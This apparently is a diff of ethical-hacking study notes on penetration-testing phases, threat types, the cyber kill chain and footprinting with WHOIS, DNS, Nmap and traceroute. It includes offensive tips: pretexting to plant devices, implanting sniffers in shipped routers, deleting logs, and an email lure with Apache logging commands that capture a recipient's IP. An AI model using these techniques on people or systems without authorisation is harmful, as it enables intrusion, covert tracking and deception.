+. E.g. ok with SQL injection tests and brute force attacks but no DDoS attacks to not have service disruption or to not have network costs.
+- 🤗 Used also by armies, e.g. US army cannot fire on somebody unless they're firing on them.
+
+### Understanding the clients requirements
+
+- Pen-tester needs to understand the client's requirements.
+  - 💡 Also make sure client understands that themselves as well as they may not understand what they're asking you to do
+- Important for testers reputation and clients satisfaction.
+- 💡 Create checklists.
+  - Make suggestions
+  - Ensure everything is clear without loose ends
+  - Best to be clear as changing something during testing is not good as it would postpone the deadline and cost more for the client.
+
+### Defining the scope
+
+- Ensures that requirements are fulfilled, and objectives are met.
+- Objectives should be determined first e.g.
+  - **Deliverables**: Different reports and often a final report where all results are placed and documented.
+  - **Functionality**: Verifies the system you're pen-testing is working as intended
+  - **Technical structure**: Design of the whole project
+  - **Data definition**
+- Defines areas/parts of the system that'll be tested e.g.:
+  - Network security
+    - E.g. check routers for faulty configurations, outdated operative systems.
+  - System software security
+  - Client-side application security
+  - Client-side to server-side communication security
+  - Server-side application security
+  - Document security
+  - Physical security
+    - E.g. how are people tracked? How is access granted and controlled? How are the access policies enforced?
+  - Application communication security
+  - [Dumpster diving](./../10-social-engineering/social-engineering-types.md#dumpster-diving)
+  - Insiders
+  - Sabotage intruder confusion
+  - Intrusion detection
+  - Intrusion response
+  - Social engineering
+
+### Information gathering
+
+- To goal is to gather as much information about the target as possible
+- Information is used to map out the target's network and plan the attack.
+- See also [Reconnaissance | Hacking stages](./hacking-stages.md#1-reconnaissance) and [Footprinting](./../02-footprinting/footprinting-overview.md)
+- Information can include
+  - **Physical and logical locations**
+    - e.g. for servers
+  - **Analog connections**
+    - E.g. phones, GSM networks
+    - 🤗 You can create your own cellphone tower and take over their connections as you'll have the strongest signal.
+  - **Contact information**
+    - E.g. sitting in a near coffee to take photos and take names. You can then look at their contact information in list of employees (if publicly available somewhere). They become suspectable to social engineering.
+  - **Information about other organizations**
+    - 🤗 E.g. You can come with a rack suit to fix air-conditioning devices and say "hey there's a problem in air conditioning on floor 14" or "regular maintenance" or "one of your devices is due.". A security personal mey escort you but he won't watch everything carefully, you can place a Raspberry Pie and connect it to electricity. Refer to the following video: [Sneaking in EVERYWHERE for FREE (Yellow Vest Experiment)](https://www.youtube.com/watch?v=GyvRamX1VyA)
+      - Stupid and simple. Something too complex has higher risks of not working as the dumber it is, the simple it is, it'll probably work.
+
+## 2. Attack phase
+
+- Phase where target gets compromised.
+- Information gathered in the previous one is used to carry out an attack.
 - Steps
-  1. Perform a [risk assessment](./risk-management.md#risk-assessment)
-  2. Utilize standard guidelines
-  3. Include senior management
-  4. Define sanctions
-  5. Distribute the final version
-  6. Ensure that employees have read the policy
-  7. Enforce policies
-  8. Educate and train employees
-  9. Review and update the policy
-- Human Resource department has the responsibility to
-  - educate and train employees in practices defined by the company's security policies
-  - monitor the implementation of the policies
-  - enforce penalties
-
-### Top-down vs Bottom-up
-
-- **Top-down**
-  - Begins with management establishing a framework for initiating and implementing security practices in the enterprise.¨
-  - Most important way to ensure employees across an organization will support and follow the policies
-- **Bottom-up**
-  - Occurs when the system administrators and security personnel try to establish a security program on their own without senior management support and enforcement.
-# Security threats and attacks
-
-- The more valuable information is the higher the threats and chances for an attack are.
-
-## Security threats
-
-- 📝 **Threat** means anything that has potential of causing damage to the system.
-
-### Types of threats
-
-#### Network threats
-
-- **Network** is the set of devices that are connected through communication channels where data exchange happens between devices
-- Attacker may break into the channel and steal the information that is being exchanged.
-- E.g. • [denial of service attacks (DoS)](./../13-web-applications/denial-of-service.md) • [password-based attacks](./../06-system-hacking/cracking-passwords-overview.md) • compromised-key attacks, firewall and IDS attacks • DNS and ARP poisoning • man in the middle (MITM) attack • spoofing • [session hijacking](./../13-web-applications/session-hijacking.md) • information gathering • sniffing...
-
-#### Host threats
-
-- Attack that tries to gain access to information from a system
-- E.g. • [password attacks](./../06-system-hacking/cracking-passwords-overview.md) • unauthorized access • profiling • [malware attacks](./../07-malware/malware-overview.md) • [footprinting](./../02-footprinting/footprinting-overview.md) • [denial of service attacks (DoS)](./../13-web-applications/denial-of-service.md) • arbitrary code execution • privilege escalation • [backdoor attacks](./../07-malware/malware-overview.md#backdoor) • [physical security](./physical-security.md) threats
-
-#### Application threats
-
-- Exploitation of vulnerabilities that exists in the application itself
-  - Caused by e.g. bad coding practices
-  - Rushed programs has mistakes e.g. lack of validation of input data
-- Can be found through reverse engineering, or trial and error
-- Large codes that are difficult to maintain has more vulnerabilities.
-- Mostly because of improper input validation.
-- E.g. • [SQL injection](./../14-sql-injection/sql-injection-overview.md) • cross-site scripting • [session hijacking](./../13-web-applications/session-hijacking.md) • identity spoofing • improper input validation • security misconfiguration • information disclosure • [hidden-field manipulation](./../13-web-applications/hacking-web-applications.md#hidden-field-manipulation) • broken session management • [cryptography attacks](./../15-cryptography/cryptanalysis.md#cryptography-attacks) • [buffer overflow attacks](./../12-web-servers/web-server-threats-and-attacks.md#buffer-overflow-attacks) • [phishing](./../10-social-engineering/social-engineering-types.md#phishing)
-
-## Security attacks
-
-- Or **cyber attack**
-- Attempt to gain unauthorized access to a system or network.
-- Actualization of a threat
-
-### Motives
-
-- Attack = Motive + Vulnerability + Method (exploit)
-- General core of every motives is access to the valuable information
-- Common motives:
-  - Interrupting the flow of business activities and processes
-  - Stealing valuable information
-  - Data manipulation
-  - Stealing money and important financial information
-  - Revenge
-  - Ransom
-
-### Types of attacks
-
-- You need to find vulnerability in a system to have an attack
-- You can never prove that's its not vulnerable, but can prove it's vulnerable.
-  - or You can never prove that a system is secure, but can prove it's insecure.
-
-#### Operating system attacks
-
-- ❗ If OS is taken over protecting applications won't matter.
-- Vulnerabilities include
-  - Bugs (as it's a big codebase)
-  - Buffer overflow
-  - Unpatched operating systems
-    - Can lead to successful leads using already known vulnerabilities
-    - 🤗 E.g. Microsoft had already patched the [EternalBlue vulnerability](https://en.wikipedia.org/wiki/EternalBlue) that NSA developed before it was leaked to public. However, many systems still remained unpatched due to users not updating their systems. So the same vulnerability on unpatched systems were still successfuly exploited by first [WannaCry ransomware](https://en.wikipedia.org/wiki/WannaCry_ransomware) that compromised hundreds of thousands computers, and then by [NotPetya malware](https://en.wikipedia.org/wiki/Petya_(malware)). [1]
-- Attacks include
-  - Exploiting network protocol implementations
-  - [Authentication attacks](./../13-web-applications/hacking-web-applications.md#authentication-attacks)
-  - [Cracking passwords](./../06-system-hacking/cracking-passwords-overview.md)
-  - Breaking filesystem security
-- 💡 Secure OS is an OS that's updated, monitored, regulated as frequently as possible.
-- See also [banner grabbing](./../03-scanning-networks/banner-grabbing.md)
-
-[1]: https://en.wikipedia.org/wiki/EternalBlue
-
-#### Misconfiguration attacks
-
-- Hacker gains access to the system that has poorly configured security.
-- Can affect works, databases, web servers, etc.
-- E.g. • using default accounts (passwords) • forgetting Apache server online to allow proxy requests enabling DDoS attacks
-- 💡 Detected mostly by automated scanners
-
-#### Application-level attacks
-
-- Similar to OS attacks but far less damaging as their scope is far narrower.
-- Caused by lack of testing as developers rush development of applications and miss something.
-- E.g. • sensitive information disclosure • buffer overflow attack • SQL injection v cross-site scripting • session hijacking denial of service • man in the middle • phishing
-- 🤗 E.g. Transmission torrent client (macOS)
-  - The store where it was downloaded was compromised
-  - They substituted torrent download link to their own application
-  - See [Transmission is hacked to spread malware](https://blog.malwarebytes.com/threat-analysis/2016/09/transmission-hijacked-again-to-spread-malware/)
-
-#### Shrink-wrap code attacks
-
-- Attacks on libraries and frameworks that the software is depended on.
-- Finding vulnerabilities in libraries allows re-using same exploits on more than single application
-- 💡 Use libraries: older, more mature, maintained, updated actively with proven track record.
-- E.g.
-  - A bug is fixed in library but application uses older version.
-  - Application uses libraries in debug mode or with default configurations.
-
-### Attack vectors
-
-- Attack vector = Means by which hackers deliver a payload to systems and networks
-- [Cloud computing threats](./../16-cloud-computing/cloud-security.md#cloud-computing-risks-and-threats) such as data breach and loss.
-- [IoT threats](./../18-iot-and-ot/iot-security.md#iot-threats) usually caused by insecure devices and hardware constraints (battery, memory, CPU etc.)
-- [Ransomware](../07-malware/malware-overview.md#ransomware): Restricts access to your files and requires payment to be granted access
-- [Mobile threats](./../17-mobile-platforms/mobile-attacks.md#mobile-threats)
-
-#### Advanced Persistent Threats (APT)
-
-- 📝 Stealthy threat actor with continuous attacks targeting a specific entity.
-- APT groups include:
-  - [APT 10 - Red Apollo @China](https://en.wikipedia.org/wiki/Double_Dragon_(hacking_organization))
-  - [Equation Group @USA](https://en.wikipedia.org/wiki/Equation_Group)
-  - [APT 29 - Cozy Bear @Russia](https://en.wikipedia.org/wiki/Cozy_Bear)
-  - and [many more](https://en.wikipedia.org/wiki/Advanced_persistent_threat#APT_groups)...
-- **Advanced**
-  - Uses special malware, often crafted for specific organizations
-    - Usually a modified version of common malware used in botnets
-  - Sophisticated techniques against target not generic
-- **Persistent**
-  - Long-term presence with external command and control
-  - Extracting data
-    - Usually ***low-and-slow*** to avoid detection
-    - E.g. instead of sending big data, it breaks data to chunks and sends each chunk whenever a user is connected to the internet
-- **Threat**
-  - Targets high value organizations and information
-  - E.g. governments and big companies
-- 🤗 E.g.
-  - [Sony Pictures hack](https://en.wikipedia.org/wiki/Sony_Pictures_hack) where sensitive data from Sony, e.g. unreleased movies was published as torrents.
-  - [2020 United States federal government data breach](https://en.wikipedia.org/wiki/2020_United_States_federal_government_data_breach) where more than 18.000 US companies and government agencies where hacked.
-- Common steps
-  1. Create a breach e.g. through spear phishing
-  2. Exploit inner system vulnerabilities
-  3. Control of the system or its segments
-  4. Data exfiltration (= unauthorized data transfer)
-
-#### Viruses and worms
-
-- Both can replicates themselves throughout the system in files, documents.
-- Have capabilities to infect systems and networks in a quick time.
-- [Virus](./../07-malware/viruses.md): Requires user action to be activated e.g. running a file that has a virus embedded.
-- [Worm](./../07-malware/malware-overview.md#worm): can spread independently without any user action i.e. self-replicating
-
-#### Botnet
-
-- 📝 Used by hackers to control the infected machines e.g. phones, PC, IoT
-- Hackers perform malicious activities from the machines on which bots run eg. DDoS attacks.
-- Main problem is lack of security software or proper updates on devices.
-- See also [Botnet trojans](./../07-malware/trojans.md#botnet-trojans) and [Botnets | Denial of Service](./../13-web-applications/denial-of-service.md#botnets)
-
-#### Insider attacks
-
-- Performed by a person from within the organization who has authorized access.
-  - E.g. disgruntled employee, employee paid by a third-party
-- Presents one of the greatest potential of risk and most difficult attacks to defend against.
-- See also [Insider attacks | Social engineering types](./../10-social-engineering/social-engineering-types.md#insider-attacks).
-
-##### Insider threat types
-
-- **Pure insider**
-  - Inside employee with normal access rights
-- **Elevated pure insider**
-  - Insider with elevated access
-- **Insider associate**
-  - Insider with limited authorized access (e.g. guard, cleaning person)
-- **Insider affiliate**
-  - Spouse, friend, or client of an employee that uses employee's credentials.
-- **Outsider affiliate**
-  - Unknown and untrusted person from outside the organization.
-  - Uses an open access channel or stolen credentials to gain unauthorized access.
-
-##### Insider attack countermeasures
-
-- Restricting access
-- Logging to know who access what at what point of time
-- Active monitoring of employees with elevated privileges
-- Trying to not have disgruntled employees
-- Separation of duties
-  - Also known as **segregation of duties**
-  - Concept of having more than one person required to complete a task.
-  - See also [Separation of duties | Cloud computing](./../16-cloud-computing/cloud-computing.md#separation-of-duties)
-
-#### Phishing
-
-- See [Phishing | Social Engineering Types](./../10-social-engineering/social-engineering-types.md#phishing)
-
-#### Web application threats
-
-- Takes advantage of poorly written code and lack of proper validation of input and output data.
-- E.g. buffer overflows, SQL injections, cross-site scripting
-- 💡 There are many online scanning tools to detect those.
-
-## Modern age information warfare
-
-- Use of information and communication technologies for competitive advantages over an opponent
-- Weapons include • viruses • worms • trojan horses • logic bombs • trap doors • nano machines and microbes • electronic jamming • penetration exploits and tools.
-- E.g.
-  - Corporations spy on each other to use each others technology secrets and patents
-    - 🤗 Also known as [Industrial espionage](https://en.wikipedia.org/wiki/Industrial_espionage)
-  - Governments spy on other governments by using hackers as proxies to gain information about e.g. defense systems.
-  - Intellectual property thefts with reverse engineering to create products without investing in R&D
-- Categories include:
-  - **Command and control (C2) warfare**
-    - Taking down the command center may protect the headquarters but may interfere with their mobility
-  - **Intelligence-based warfare**
-    - Sensor-based technology to disrupt systems
-  - **Electronic warfare**
-    - Enhance, degrade, or intercept the flow of information
-  - **Psychological warfare**
-    - "Capture their minds and their hearts and souls will follow"
-    - E.g. propaganda or terror
-  - **Hacker warfare**
-    - Acquire information about subject A, sell it to subject B.
-  - **Economic information warfare**
-    - Channeling or blocking information to pursue economic dominance
-  - **Cyber warfare**: use of information systems against virtual personas
-- Each category can have:
-  - **Offensive strategy**
-    - Attacks against an opponent
-    - E.g. web application attacks, malware attacks, system hacking..
-  - **Defensive strategy**
-    - Actions taken against attacks.
-    - E.g. monitoring, alerts, response, detection, prevention systems
-- See also [Information Warfare website](http://www.iwar.org.uk)
-# Threat intelligence and forensics
-
-## Cyber kill chain
-
-- Framework for identification and prevention of cyber intrusions activity.
-- Developed by [Lockheed Martin](https://www.lockheedmartin.com/)
-- Identifies what the adversaries must complete in order to achieve their objective.
-- 🤗 Based on military kill chains, a concept consisting of • target identification • force dispatch to target decision • order to attack the target • the destruction of the target
-- 🤗 Critiques states it only defends "perimeter" and isn't suitable model to insider threats.
-- E.g. [A "Kill Chain" Analysis of the 2013 Target Data Breach](https://www.commerce.senate.gov/services/files/24d3c229-4f2f-405d-b8db-a3a67f183883)
-
-### Cyber kill chain steps
-
-- ❗ Not same in every organization as different organizations have constructed their own kill chains to try to model different threats
-
-1. **Reconnaissance**
-   - Collecting as much as information about the target.
-   - E.g. harvesting email addresses, conferece information etc.
-   - See also [footprinting](./../02-footprinting/footprinting-overview.md)
-2. **Weaponization**
-   - Analyzing collected data to identify and vulnerabilities to exploit to gain access
-   - E.g. creating a [phishing](./../10-social-engineering/social-engineering-types.md#phishing) campaign based on collected data
-3. **Delivery**
-   - Weaponized bundle to the victim via email, web, USB, etc.
-   - Key to measure the effectiveness of the defense strategies implemented by the target.
-   - E.g. sending [phishing](./../10-social-engineering/social-engineering-types.md#phishing) emails
-4. **Exploitation**
-   - Execute code on victim's system.
-   - E.g. arbitrary code execution, authentication and authorization attacks
-5. **Installation**
-   - Installing malware on the asset
-   - E.g. [backdoor](./../07-malware/malware-overview.md#backdoor) to gain remote access and maintain access in the network
-6. **Command and control**
-   - Allows remote manipulation/exploation of victim
-   - Done by establishing two-way communication between the victim and the attacker.
-   - Evidence is usually hidden using [encryption techniques](./../15-cryptography/encryption-algorithms.md)
-7. **Actions on objectives**
-   - With hands-on access, intruders accomplish their original goals.
-   - E.g. • distrupting network • gaining access to confidential data
-
-### Defensive courses of action
-
-1. **Detect**: determine whether an attacker is poking around
-2. **Deny**: prevent information disclosure and unauthorized access
-3. **Disrupt**: stop or change outbound traffic (to attacker)
-4. **Degrade**: counter-attack command and control
-5. **Deceive**: interfere with command and control
-6. **Contain**: network segmentation changes
-
-## Threat identification
-
-### Tactics, Techniques, and Procedures (TTPs)
-
-- Concept in terrorism and cyber security studies
-- Identifies patterns of behavior of the threat actors (= bad guys)
-- Aids in
-  - counterintelligence for threat prediction and detection
-  - implementing defenses
-  - profiling threat actors e.g. [APT groups](security-threats-and-attacks.md#advanced-persistent-threats-apt)
-- E.g. In [2020 United States federal government data breach](https://en.wikipedia.org/wiki/2020_United_States_federal_government_data_breach), used TTP were stealing SAML tokens to attack [SSO](identity-access-management-(iam).md#single-sign-on-sso) infrastructure according to [TTP analysis from NSA](https://media.defense.gov/2020/Dec/17/2002554125/-1/-1/0/AUTHENTICATION_MECHANISMS_CSA_U_OO_198854_20.PDF).
-- Read more at [NIST Special Publication 800-159](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-150.pdf)
-
-#### Tactics
-
-- Also called **tools** in the acronym
-- Highest-level description of the behavior
-- Describes ways attacker attacks from start to end
-- E.g.
-  - Way of gathering information e.g. [open-source intelligence](./../02-footprinting/footprinting-overview.md#open-source-intelligence-osint), [social engineering](./../10-social-engineering/social-engineering-overview.md).
-  - Way of initial compromise e.g. tools, zero-day vulnerabilities, obfuscation methods
-
-#### Techniques
-
-- Technical methods used by an attacker
-- Gives a more detailed description of behavior in the context of a [tactic](#tactics).
-- E.g.
-  - [social engineering techniques](./../10-social-engineering/social-engineering-types.md) in early stages
-  - exploit tools at middle stages
-  - and software tools to clear logs to cover tracks at later stages.
-
-#### Procedures
-
-- Lower-level, highly detailed description in the context of a [technique](#techniques).
-- Sequence of actions done by attackers
-- E.g. an actor collects business e-mails of target company then launches a [spear phishing](./../10-social-engineering/social-engineering-types.md#spear-phishing) campaign
-
-#### Adversary behaviors
-
-- Method or techniques used by attacker to penetrate victim network.
-- E.g. using PowerShell, [DNS Tunneling](../11-firewalls-ids-and-honeypots/evading-firewalls.md#dns-tunneling), [Web Shell](../06-system-hacking/escalating-privileges.md#privilege-escalation-techniques) etc.
-
-#### Indicators of Compromise (IoCs)
-
-- Artifacts observed that indicates computer intrusion with high confidence.
-- 4 categories:
-  - **Email indicators**
-    - E.g. sender's email address, subject, attachment, links.
-  - **Network indicators**
-    - E.g. URLs, domain names, IP addresses, unusual DNS requests
-  - **Host-based indicators**
-    - E.g. filenames, file hashes, registry  keys, DDLs, mutex
-  - **Behavioral indicators**
-    - E.g. memory code injection, remote command execution, document execution PowerShell script.
-# Email footprinting
-
-- By monitoring the email delivery and inspecting the e-mail headers
-- Information includes
-  - IP address of the recipient
-  - Geolocation of the recipient
-  - Delivery information
-  - Visited links
-  - Browser and OS information
-  - Reading time
-- Can track emails using various **email tracking tools**
-  - E.g. notifies sender of the email being delivered and opened by the recipient
-  - Used by marketers, sellers etc.
-
-## Email header analysis
-
-- Helps to determine an e-mail contains something malicious or not
-- Email-headers include
-  - Sender's name
-  - IP/Email address of the sender
-  - Mail server
-  - Mail server authentication system
-  - Send and delivery stamps
-  - Unique number of the message
-
-### Authentication protocol headers
-
-- Allows you to detect forged sender addresses.
-- The goal is for sender to identify itself to the receiver.
-- E-mail headers include information about their pass status
-
-#### SPF: Sender Policy Framework
-
-- E.g. `'PASS' with IP 209.85.220.69` or `'NEUTRAL' ...`
-- Verifies if the domain of the e-mail owned by the sending server.
-  - If not passed, many e-mail providers just block it.
-- Based on e-mail servers who publish records and says "here's the IP addresses we'll send e-mails"
-
-#### DKIM: DomainKeys Identified Mail
-
-- E.g. `'PASS' with domain accounts.google.com`
-- Allows the receiver to verify that an email claimed to have come from a specific domain was authorized by the owner of that domain using a digital signature on the domain.
-
-#### DMARC: Domain-based Message Authentication, Reporting and Conformance
-
-- E.g. `PASS` or `FAIL`
-- Combination of two protocols SPF + DKIM
-- It builds on them and adds more policy
-
-## Verifying email legitimacy
-
-- Double check `FROM`
-- Check the spelling in domain name so it's coming from the domain of the company
-  - If it's random e-mail check if it's from one of the biggest domain providers or if something legit.
-- Check IP of the domain
-  - It can be someones computer (home router IP) or a private server
-  - Major mail service providers checks to determine if domain of the e-mail is tied to the source IP of the e-mail (e.g. have a record)
-    - 🤗 You can tie a public WiFi (e.g. coffee shop) IP to domain and send the e-mails from there.
-
-## E-mail policies
-
-- Different e-mail service provider have different policies regarding to their SMTP
-- 💡 Once hacker recognizes e-mail servers then then he/she can create accounts there, send e-mails back and further to figure out what the rules are.
-- E.g. google does not allow you to see the IP address of the sender
-  - They proxy it behind one of their servers
-  - Workarounds are not so efficient.
-- Each have own ruling list
-  - Determines e.g. what kind of files that can be send
-
-## Getting an IP address from an e-mail
-
-- You can then get IP and a lot from browser headers including
-  - browser information, OS info, device types
-  - Revealing your IP is not safe as even home routers have pretty static IP addresses
-    - Last usually 30 days up to 3 months
-    - 💡 You can still release DHCP lease in your home router settings to get a new IP from the ISP.
-- You can send an image from a back-end server that you own
-  - Some e-mail providers request it and hide users IP
-- You can send a direct link
-  - No e-mail provider can protect you from that
-  - 🤗 Can be done through social engineering e.g.
-    - You know from social media that Bob was celebrating yesterday. You send an e-mail stating "Hi Bob, crew and I had a great time last night, you're never going to guess what Sam did in toilet, threw himself up, check out his pictures"
-  - E.g.
-    1. Install apache `yum install httpd`
-    2. Start apache `systemctl start httpd`
-    3. Create a file: `cd /var/www/html/` then `touch <RESOURCE_NAME>;`
-    4. Check logs live: `tail -f /var/log/httpd/access_log`
-    5. You'll get the IP address when the link (`<IP_ADDRESS>/<RESOURCE_NAME>`) is opened
-       - You can find out self IP address using `curl ifconfig.me`
-    6. And you can look at the location of IP using `geoiplookup <IP_ADDRESS>;`
+  1. [Penetrate the perimeter](#a-penetrating-the-perimeter)
+  2. [Acquire target](#b-target-acquisition)
+  3. [Escalate privileges](#c-privilege-escalation)
+  4. [Execute, implant, retract](#d-execute-implant-retract)
+
+### a. Penetrating the perimeter
+
+- Trying to bypass IDS (Intrusion Detection System) and firewall
+- A way is to use social engineering to test out the boundaries and find a way into the system.
+- **Firewall testing** techniques include
+  - ICMP probes
+  - Checking access control
+  - Evaluating protocol filtering rules
+  - Evaluating IDS
+- Probing allow you to see what the perimeter detects & drops & won't detect
+  - You can craft own packets and see the reactions
+    - e.g. by modifying source/destination IPs
+  - E.g. check if certain port always drops, maybe port is open but only goes through the VPN where employees access network.
+- Figure out what devices are running under perimeter to select as a target.
+  - **Enumerate devices** collecting:
+    - ID of the device
+    - Description
+    - Hostname
+    - Physical location
+    - IP and MAC address
+      - 🤗 MAC address lets you know who the manufacturer is. Manufacturer information can give you idea of what kind of OS they run. You might get what devices they are running and how they are shipped. You can go to the distributor and put some physical keyloggers or sniffers e.g. a Raspberry Pi into a large router/switch.
+  - By cross checking them later again, it is possible to identify unauthorized devices.
+
+### b. Target acquisition
+
+- Done after scanning and penetrating of the perimeter and selecting a target machine/device
+- Involves vulnerability scans to find vulnerabilities which can be later exploited
+- 📝 Includes:
+  - **Active probing assaults**
+    - Scanning the network and gathering more information
+  - **Running vulnerability scans**
+    - Completing vulnerability scans to see what vulnerabilities that the target has.
+  - **Attempt to access services and obtain data**
+    - Trusted systems and trusted process assessment
+    - Trying to access the resources on the system using the credentials obtained during the information gathering process
+      - E.g. using credentials that you have obtained through social engineering or general research of the company/system
+    - You attempt to access and extract as much as data as you can
+    - Pick-locking: try to unlock it in every possible way
+
+### c. Privilege escalation
+
+- 📝 Done once the access to the system is granted
+- Goal is to grant elevated access.
+- Techniques include
+  - **Password crackers**
+    - E.g. bruteforce, dictionary-based attack
+  - **Exploit vulnerabilities in a code** e.g.
+    - Poorly written security policies
+    - False code in the code / applications
+    - Web app version is not updated, there's a vulnerability in this version
+    - Use flaws in a system e.g. older version of OS.
+  - **[Trojans](./../07-malware/trojans.md)**
+  - **[Social engineering](./../10-social-engineering/social-engineering-overview.md)**
+    - E.g. you realized that there's no strict policy regarding e-mails. You send an e-mail for phishing scheme, gain more information when the person clicks on that link, you can then execute arbitrary code if e-mail client is old (unlikely).
+    - E.g. phone-call and ask what you need: works way more than it should
+- 🤗 A lot of companies have state-of-the-art perimeter
+  - inside perimeter they have very old equipment and OS
+  - they don't emphasize much on security interior as they do in external
+    - once you pass the perimeter, you're more likely to find something inside
+- Defenses include
+  - Running services with the least privileged accounts
+  - Implementing [multi-factor authentication/authorization](./identity-access-management-(iam).md#multi-factor-authentication-mfa)
+
+### d. Execute, implant, retract
+
+- Involves compromising the system with code.
+- Techniques include
+  - [DoS, DDoS attacks](./../13-web-applications/denial-of-service.md)
+  - buffer overflows to execute arbitrary code.
+  - using [viruses](./../07-malware/viruses.md), [trojans](./../07-malware/trojans.md), rootkits
+  - installing [backdoor](./../07-malware/malware-overview.md#backdoor)s
+- Retract means being able to exit without leaving any traces behind
+  - Traces left behind can cause suspicions and in effect vulnerablities would be patched and you cannot gain access to the target machine back using the same method.
+  - Delete all the logs that indicates you existed to ensure persistent remote access.
+  - Good idea is to figure out their antiviruses, and test your execution in a VM with same antivirus and security measures to not get detected by a random scan.
+  - If alarm is raised, you might be detected, put it in the report and result of whether the flag was investigated.
+
+## 3. Post-attack phase
+
+- The tester restores the system to the pretest state.
+- ❗Don't leave your stuff be it accidentally or on purpose as it breaks the law either way.
+  - Examples
+    - Delete any malware/rootkit installed
+    - Recover all files that were deleted
+    - Reverse any elevated privileges.
+    - Restore network settings to its original state
+    - Remove created vulnerabilities and exploits
+- Documentation / clear log of activities, results and security flaws.
 # Footprinting overview
 
 - Also known as **fingerprinting** or **reconnaissance**
@@ -2479,59 +2271,6 @@
 - Use Whois Guard
 - Restricting access to social media
   - Extra risk as you click on many links and giving away companies IP address
-# Network footprinting
-
-- Collecting network range information to use the information to map the target's network
-- Gives insights into how the network is structured and which machines belong to the network.
-
-## Nmap
-
-- Used for network discovery
-- Uses raw IP packets to determine e.g.
-  - the available hosts on the network
-  - the services offered by those hosts
-  - operating systems they are
-  - firewall types that are being used
-  - and more...
-- Not only used for malicious purposes but also for checking something is working as intended
-  - e.g. check why a port is open and confirm it's closed
-- E.g. `nmap -v -p 0-2000 -O -sV 178.128.203.1`
-  - `-v`: verbose, more output than usual
-    - `-d` prints even more.
-  - `-p`: for port
-    - default: 0-1024
-    - the higher the ranges is the longer it takes.
-  - `-O`: os detection (best guess)
-  - `-sV`: versions of all detected services (best guess)
-    - 💡 Allows you to check for vulnerabilities of a specific version of that services e.g. through [exploit database](https://www.exploit-db.com/)
-  - `178.128.203.1`: can also specify subnet also e.g. `/24`
-- 🤗 In UK and Germany it's illegal to conduct a scan on a network, more [Nmap | legal issues](https://Nmap.org/book/legal-issues.html)
-- Read more about Nmap in [Nmap | Scanning Tools](./../03-scanning-networks/scanning-tools.md#nmap)
-
-## Traceroute
-
-- 📝 Programs used for discovering routers that are on the path to the target host.
-- You always go through multiple hops before you reach target
-  - E.g. first hop being your router, then routers & switches ISP provider and the router that sends traffic out of the country...
-- Helps hacker to collect information about
-  - network topology
-  - trusted routers
-  - firewall locations
-- Can use protocols such as `ICMP` (often), `TCP`, `UDP`, `DCPP`..
-- ❗ There can be hops that are invisible/undetectable
-  - 💡 You can craft special packets to detect them with custom time to lives, their failure
-- Uses TTL field in the IP header to discover the route.
-  - Starts by setting TTL to 1
-  - Stops at each hop on the way to the destination and providing information to the sender about that hop
-  - The TTL is incremented by 1 for each hop discovered
-- Used to create network diagrams and plan attacks.
-- Helps with e.g. man-in-the-middle attacks.
-- It records IP addresses and DNS names of discovered routers.
-- Commands
-  - Unix tool: `traceroute 178.128.203.1` (uses UDP)
-  - Using Nmap: `nmap traceroute --script traceroute-geolocation 178.128.203.1 -d`
-  - Using hping: `hping3 –traceroute -S {target ip}`
-  - Windows tool: `tracert 178.128.203.1` (uses ICMP)
 # Search engines and online resources
 
 - For e.g. information about the target organization's employees, intranet, login pages...
@@ -2656,6 +2395,181 @@
 - Helps you find IP addresses behind a CDN (e.g. CloudFlare)
 - **CDN**: Protects against DDoS, geolocation of servers by having different IP address.
 - People often use real IP addresses before CDN, you can then look at past DNS records to find it.
+# WHOIS, GeoIpLocation and DNS interrogation
+
+- All public records, accessing is not illegal.
+
+## WHOIS
+
+- Query and response protocol (port 43)
+- Used for retrieving information about assigned Internet resources
+- To get WHOIS information you can
+  - Use different websites such as [whois.net](https://www.whois.net)
+  - Use command-line: `whois cloudarchitecture.io`
+- Two models
+  - **Thick WHOIS**: information from all registrars for the specified set of data.
+  - **Thin WHOIS**: limited information about the specified set of data.
+
+### WHOIS results
+
+- Domain details
+- 📝 Domain owner details
+  - Includes contact information of the owner
+  - Can be hidden by a **WHOIS guard**
+    - A proxy between the owner of the domain and who's accessing
+    - Emails are usually still redirected to the owner.
+      - 💡 Allows for e-mail phishing to learn who the actual owner is.
+- Domain server
+  - Who it's registered with e.g. [NameCheap.com](https://www.namecheap.com), [Gandi.net](https://www.gandi.net)
+  - 💡 Site owner might have account in the server, and you can test passwords there.
+- Net range
+- Domain expiration
+  - 💡 If auto-renewal fails, someone can transfer a domain to another address for malicious behaviors or just to sell it back to you.
+- Creation and last update dates
+
+### Regional internet registries
+
+- WHOIS databases are maintained by the Regional Internet Registries (RIRs) such as:
+  - **ARIN**: American Registry for Internet Numbers
+  - **AFRINIC**: African Network Information Center
+  - **APNIC**: Asia Pacific Network Information Center
+  - **RIPE**: Réseaux IP Européens Network Coordination Centre
+  - **LACNIC**: Latin American and Caribbean Network Information Center
+- 🤗 Every ISP, hosting company etc. must be member of one of the registries to get IP addresses.
+
+## IP geolocation
+
+- Helps find location information about a target
+- Includes country, city, postal code, ISP, and so on
+  - Country is mostly accurate but city, coordinates are not but approximated
+- Helps with social engineering attacks
+- E.g. [GeoIpTool.com](https://geoiptool.com)
+
+### DNS interrogation
+
+- Collecting information about DNS zone data.
+  - e.g. server types and their locations
+- Includes information about key hosts in the network
+- 📝 E.g. `host -t a cloudarchitecture.com`
+  - `t` stands for type of domain record `a` gives A type of domain records.
+  - Returns something likes this:
+
+    ```txt
+        cloudarchitecture.io has address 13.33.17.159
+        cloudarchitecture.io has address 13.33.17.136
+    ```
+
+  - A records returns multiple IP addresses to increase speed and availability e.g. when hosting same content in multiple continents.
+- See also [DNS enumeration](./../04-enumeration/dns-enumeration.md#dns-records)
+
+#### Reverse DNS lookup
+
+- Use one of IP addresses that's listed as an A
+- `host 13.33.17.159`
+  - Returns `159.17.33.13.in-addr.arpa domain name pointer server-13-33-17-159.arn53.r.cloudfront.net.`
+- Multiple IP addresses can be tied to same domain
+  - multiple domain addresses that are tied to the same IP
+
+#### MX records
+
+- Can be retrieved with `-t mx`
+- Exposes which e-mail service they use
+- Have a preference number to tell the SMTP client to try (and retry) each of the relevant addresses in the list in order, until a delivery attempt succeeds
+  - The smallest preference number has the highest priority
+- 💡 Once a hacker know who the e-mail provider is, he/she can create fake-mails using the provider to test e.g.
+  - What kind of content is allowed
+  - If a file be modified so it appears as PDF but make it executable
+  - When an e-mail is labeled as spam / malicious
+# Email footprinting
+
